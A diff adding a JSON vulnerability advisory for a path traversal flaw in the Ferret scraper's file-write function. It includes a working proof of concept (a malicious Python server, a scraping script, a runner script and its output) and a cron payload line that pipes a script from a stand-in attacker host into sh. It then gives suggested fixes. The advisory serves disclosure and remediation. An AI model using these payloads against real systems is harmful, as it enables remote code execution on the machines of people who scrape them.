@@ -1,0 +1,72 @@
+{
+  "id": "GHSA-j6v5-g24h-vg4j",
+  "modified": "2026-04-02T13:35:41.810085Z",
+  "published": "2026-04-01T23:37:29Z",
+  "aliases": [
+    "CVE-2026-34783"
+  ],
+  "summary": "Ferret: Path Traversal in IO::FS::WRITE allows arbitrary file write when scraping malicious websites",
+  "details": "## Summary\n\nA path traversal vulnerability in Ferret's `IO::FS::WRITE` standard library function allows a malicious website to write arbitrary files to the filesystem of the machine running Ferret. When an operator scrapes a website that returns filenames containing `../` sequences, and uses those filenames to construct output paths (a standard scraping pattern), the attacker controls both the destination path and the file content. This can lead to remote code execution via cron jobs, SSH authorized_keys, shell profiles, or web shells.\n\n## Exploitation\n\nThe attacker hosts a malicious website. The victim is an operator running Ferret to scrape it. The operator writes a standard scraping query that saves scraped files using filenames from the website -- a completely normal and expected pattern.\n\n### Attack Flow\n\n1. The attacker serves a JSON API with crafted filenames containing `../` traversal:\n\n```json\n[\n  {\"name\": \"legit-article\", \"content\": \"Normal content.\"},\n  {\"name\": \"../../etc/cron.d/evil\", \"content\": \"* * * * * root curl http://attacker.com/shell.sh | sh\\n\"}\n]\n```\n\n2. The victim runs a standard scraping script:\n\n```fql\nLET response = IO::NET::HTTP::GET({url: \"http://evil.com/api/articles\"})\nLET articles = JSON_PARSE(TO_STRING(response))\n\nFOR article IN articles\n    LET path = \"/tmp/ferret_output/\" + article.name + \".txt\"\n    IO::FS::WRITE(path, TO_BINARY(article.content))\n    RETURN { written: path, name: article.name }\n```\n\n3. FQL string concatenation produces: `/tmp/ferret_output/../../etc/cron.d/evil.txt`\n\n4. `os.OpenFile` resolves `../..` and writes to `/etc/cron.d/evil.txt` -- outside the intended output directory\n\n5. The attacker achieves arbitrary file write with controlled content, leading to code execution.\n\n### Realistic Targets\n\n| Target Path | Impact |\n|-------------|--------|\n| `/etc/cron.d/\u003cname\u003e` | Command execution via cron |\n| `~/.ssh/authorized_keys` | SSH access to the machine |\n| `~/.bashrc` or `~/.profile` | Command execution on next login |\n| `/var/www/html/\u003cname\u003e.php` | Web shell |\n| Application config files | Credential theft, privilege escalation |\n\n## Proof of Concept\n\n### Files\n\nThree files are provided in the `poc/` directory:\n\n**`evil_server.py`** -- Malicious web server returning traversal payloads:\n\n```python\n\"\"\"Malicious server that returns filenames with path traversal.\"\"\"\nimport json\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\n\nclass EvilHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        if self.path == \"/api/articles\":\n            self.send_response(200)\n            self.send_header(\"Content-Type\", \"application/json\")\n            self.end_headers()\n            payload = [\n                {\"name\": \"legit-article\",\n                 \"content\": \"This is a normal article.\"},\n                {\"name\": \"../../tmp/pwned\",\n                 \"content\": \"ATTACKER_CONTROLLED_CONTENT\\n\"\n                            \"# * * * * * root curl http://attacker.com/shell.sh | sh\\n\"},\n            ]\n            self.wfile.write(json.dumps(payload).encode())\n        else:\n            self.send_response(404)\n            self.end_headers()\n\nif __name__ == \"__main__\":\n    server = HTTPServer((\"0.0.0.0\", 9444), EvilHandler)\n    print(\"Listening on :9444\")\n    server.serve_forever()\n```\n\n**`scrape.fql`** -- Innocent-looking Ferret scraping script:\n\n```fql\nLET response = IO::NET::HTTP::GET({url: \"http://127.0.0.1:9444/api/articles\"})\nLET articles = JSON_PARSE(TO_STRING(response))\n\nFOR article IN articles\n    LET path = \"/tmp/ferret_output/\" + article.name + \".txt\"\n    LET data = TO_BINARY(article.content)\n    IO::FS::WRITE(path, data)\n    RETURN { written: path, name: article.name }\n```\n\n**`run_poc.sh`** -- Orchestration script (expects the server to be running separately):\n\n```bash\n#!/bin/bash\nset -e\nSCRIPT_DIR=\"$(cd \"$(dirname \"$0\")\" \u0026\u0026 pwd)\"\nREPO_ROOT=\"$(cd \"$SCRIPT_DIR/..\" \u0026\u0026 pwd)\"\nFERRET=\"$REPO_ROOT/bin/ferret\"\n\necho \"=== Ferret Path Traversal PoC ===\"\n[ ! -f \"$FERRET\" ] \u0026\u0026 (cd \"$REPO_ROOT\" \u0026\u0026 go build -o ./bin/ferret ./test/e2e/cli.go)\n\nrm -rf /tmp/ferret_output \u0026\u0026 rm -f /tmp/pwned.txt \u0026\u0026 mkdir -p /tmp/ferret_output\n\necho \"[*] Running scrape script...\"\n\"$FERRET\" \"$SCRIPT_DIR/scrape.fql\" 2\u003e/dev/null || true\n\nif [ -f \"/tmp/pwned.txt\" ]; then\n    echo \"[!] VULNERABILITY CONFIRMED: /tmp/pwned.txt written OUTSIDE output directory\"\n    cat /tmp/pwned.txt\nfi\n```\n\n### Reproduction Steps\n\n```bash\n# Terminal 1: start malicious server\npython3 poc/evil_server.py\n\n# Terminal 2: build and run\ngo build -o ./bin/ferret ./test/e2e/cli.go\nbash poc/run_poc.sh\n\n# Verify: /tmp/pwned.txt exists outside /tmp/ferret_output/\ncat /tmp/pwned.txt\n```\n\n### Observed Output\n\n```\n=== Ferret Path Traversal PoC ===\n\n[*] Running innocent-looking scrape script...\n\n[{\"written\":\"/tmp/ferret_output/legit-article.txt\",\"name\":\"legit-article\"},\n {\"written\":\"/tmp/ferret_output/../../tmp/pwned.txt\",\"name\":\"../../tmp/pwned\"}]\n\n=== Results ===\n\n[*] Files in intended output directory (/tmp/ferret_output/):\n-rw-r--r--  1 user user  46 Mar 27 18:23 legit-article.txt\n\n[!] VULNERABILITY CONFIRMED: /tmp/pwned.txt exists OUTSIDE the output directory!\n\n    Contents:\n    ATTACKER_CONTROLLED_CONTENT\n    # * * * * * root curl http://attacker.com/shell.sh | sh\n```\n\n## Suggested Fix\n\n### Option 1: Reject path traversal in `IO::FS::WRITE` and `IO::FS::READ`\n\nResolve the path and verify it doesn't contain `..` after cleaning:\n\n```go\nfunc safePath(userPath string) (string, error) {\n    cleaned := filepath.Clean(userPath)\n    if strings.Contains(cleaned, \"..\") {\n        return \"\", fmt.Errorf(\"path traversal detected: %q\", userPath)\n    }\n    return cleaned, nil\n}\n```\n\n### Option 2: Base directory enforcement (stronger)\n\nAdd an optional base directory that FS operations are jailed to:\n\n```go\nfunc safePathWithBase(base, userPath string) (string, error) {\n    absBase, _ := filepath.Abs(base)\n    full := filepath.Join(absBase, filepath.Clean(userPath))\n    resolved, err := filepath.EvalSymlinks(full)\n    if err != nil {\n        return \"\", err\n    }\n    if !strings.HasPrefix(resolved, absBase+string(filepath.Separator)) {\n        return \"\", fmt.Errorf(\"path %q escapes base directory %q\", userPath, base)\n    }\n    return resolved, nil\n}\n```\n## Root Cause\n\n`IO::FS::WRITE` in `pkg/stdlib/io/fs/write.go` passes user-supplied file paths directly to `os.OpenFile` with no sanitization:\n\n```go\nfile, err := os.OpenFile(string(fpath), params.ModeFlag, 0666)\n```\n\nThere is no:\n- Path canonicalization (`filepath.Clean`, `filepath.Abs`, `filepath.EvalSymlinks`)\n- Base directory enforcement (checking the resolved path stays within an intended directory)\n- Traversal sequence rejection (blocking `..` components)\n- Symlink resolution\n\nThe same issue exists in `IO::FS::READ` (`pkg/stdlib/io/fs/read.go`):\n\n```go\ndata, err := os.ReadFile(path.String())\n```\n\nThe `PATH::CLEAN` and `PATH::JOIN` standard library functions do **not** mitigate this because they use Go's `path` package (URL-style paths), not `path/filepath`, and even `path.Join(\"/output\", \"../../etc/cron.d/evil\")` resolves to `/etc/cron.d/evil` -- it normalizes the traversal rather than blocking it.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/MontFerret/ferret/v2",
+        "purl": "pkg:golang/github.com/MontFerret/ferret/v2"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "2.0.0-alpha.4"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-j6v5-g24h-vg4j/GHSA-j6v5-g24h-vg4j.json"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/MontFerret/ferret",
+        "purl": "pkg:golang/github.com/MontFerret/ferret"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "0.18.1"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-j6v5-g24h-vg4j/GHSA-j6v5-g24h-vg4j.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/MontFerret/ferret/security/advisories/GHSA-j6v5-g24h-vg4j"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/MontFerret/ferret/commit/160ebad6bd50f153453e120f6d909f5b83322917"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/MontFerret/ferret"
+    }
+  ]
+}
